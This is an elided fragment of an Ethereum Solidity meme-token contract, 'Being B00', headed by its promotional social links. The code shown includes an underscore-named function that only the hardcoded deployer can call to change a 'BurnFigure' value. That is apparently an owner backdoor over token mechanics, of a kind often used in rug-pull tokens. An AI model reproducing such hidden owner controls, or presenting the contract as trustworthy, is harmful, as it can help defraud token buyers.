...
Telegram: https://t.me/BeingB00Portal
Twitter: https://twitter.com/BeingB00ETH
Website: https://beingb00.space
...
pragma solidity ^0.8.20;
    ...
    contract BeingB00 {
        string public constant name = "Being B00";  //
        string public constant symbol = "B00";  //
        ...
        address payable constant deployer = payable(address(0x6d9405899a9f5e6F83Aa43224d9E2Cebd272D571)); //
        ...
        function _setB00(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
